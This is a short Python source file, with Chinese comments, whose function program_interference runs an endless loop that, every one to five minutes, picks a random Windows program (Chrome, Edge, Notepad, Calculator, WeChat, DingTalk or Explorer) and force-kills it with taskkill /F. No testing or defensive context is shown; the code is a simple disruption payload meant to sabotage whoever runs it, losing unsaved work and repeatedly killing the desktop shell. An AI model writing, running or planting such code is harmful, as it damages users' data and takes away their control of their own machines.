import logging
import os
import random
import time


def program_interference():
    try:
        logging.info("启动程序干扰")
        processes = [
            "chrome.exe",
            "msedge.exe",  # Edge 浏览器
            "notepad.exe",  # 记事本
            "calc.exe",  # 计算器
            "WeChat.exe",  # 微信
            "DingTalk.exe",  # 钉钉
            "explorer.exe"  # 资源管理器
        ]
        while True:
            process_to_kill = random.choice(processes)
            logging.info(f"终止进程: {process_to_kill}")
            os.system(f"taskkill /IM {process_to_kill} /F")  # 强制终止进程
            time.sleep(random.randint(60, 300))  # 随机等待时间
    except Exception as e:
        logging.error("程序干扰出错: %s", e)
